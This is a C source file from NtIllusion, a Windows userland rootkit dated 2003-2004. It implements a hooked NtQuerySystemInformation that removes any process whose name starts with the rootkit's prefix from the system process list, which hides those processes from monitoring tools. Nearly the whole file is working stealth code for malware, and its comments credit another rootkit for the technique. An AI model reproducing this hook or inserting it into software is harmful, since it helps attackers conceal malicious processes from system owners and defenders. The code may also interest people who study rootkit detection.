/******************************************************************************
  kNTIProcess.c	: Process stealth
  *****************************************************************************
  Author		: Kdm (Kodmaker@syshell.org)
  WebSite		: http://www.syshell.org

  Copyright (C) 2003,2004 Kdm
  *****************************************************************************
  This file is part of NtIllusion.

  NtIllusion is free software; you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation; either version 2 of the License, or
  (at your option) any later version.

  NtIllusion is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with NtIllusion; if not, write to the Free Software
  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA
  ******************************************************************************/

#include <windows.h>
#include "kNTIProcess.h"
#include "../../Misc/kNTIConfig.h"
#include "../../Misc/kNTILib.h"

FARPROC fNtQuerySystemInformation;
extern FARPROC fGetProcAddress;

//		MyNtQuerySystemInformation : install a hook at system query level to prevent
//		_nti* processes from being shown
//		Thanks to R-e-d for this function released in rkNT rootkit. (redkod.com)
DWORD WINAPI MyNtQuerySystemInformation(DWORD SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, 
								PULONG ReturnLength)
{
	PSYSTEM_PROCESS_INFORMATION pSpiCurrent, pSpiPrec;
	char *pname = NULL;
	DWORD rc;	
	if(!fNtQuerySystemInformation) {
		fNtQuerySystemInformation = (FARPROC) fGetProcAddress(GetModuleHandle("ntdll.dll"),"NtQuerySystemInformation");
		if(!fNtQuerySystemInformation) return 0;
	}

	// 1st of all, get the return value of the function
	rc = fNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
	
	// if sucessfull, perform sorting
	if (rc == STATUS_SUCCESS)
	{
		// system info
		switch (SystemInformationClass)
		{
			// process list 
		case SystemProcessInformation:			
			pSpiCurrent = pSpiPrec = (PSYSTEM_PROCESS_INFORMATION) SystemInformation;
			
			while (1)
			{				
				// alloc memory to save process name in AINSI 8bits string charset
				pname = (char *) GlobalAlloc(GMEM_ZEROINIT, pSpiCurrent->ProcessName.Length + 2);
				if (pname == NULL) return (rc); // alloc failed ?
				
				// Convert unicode string to ainsi
				WideCharToMultiByte(CP_ACP, 0, pSpiCurrent->ProcessName.Buffer, pSpiCurrent->ProcessName.Length + 1, pname, pSpiCurrent->ProcessName.Length + 1, NULL, NULL);
				
				if(!_strnicmp((char*)pname, RTK_PROCESS_CHAR, strlen(RTK_PROCESS_CHAR))) // if "hidden" process
				{
					if(VERBOSE_STEALTH) OutputString("[!] NTIllusion made the process '%s' hidden.\n", (char*)pname);
					if (pSpiCurrent->NextEntryDelta == 0) {
						pSpiPrec->NextEntryDelta = 0;
						break;
					}
					else {
						pSpiPrec->NextEntryDelta += pSpiCurrent->NextEntryDelta;
						pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION) ((PCHAR) pSpiCurrent + pSpiCurrent->NextEntryDelta);
					}
				}
				else
				{
					if (pSpiCurrent->NextEntryDelta == 0) break;
					pSpiPrec = pSpiCurrent;
					
					// Walk the list
					pSpiCurrent = (PSYSTEM_PROCESS_INFORMATION) ((PCHAR) pSpiCurrent + pSpiCurrent->NextEntryDelta);
				}
				
				if (pname) GlobalFree(pname); // free process's name memory
			} // while
			break;
		} // switch
	} // if
	
	return (rc);
}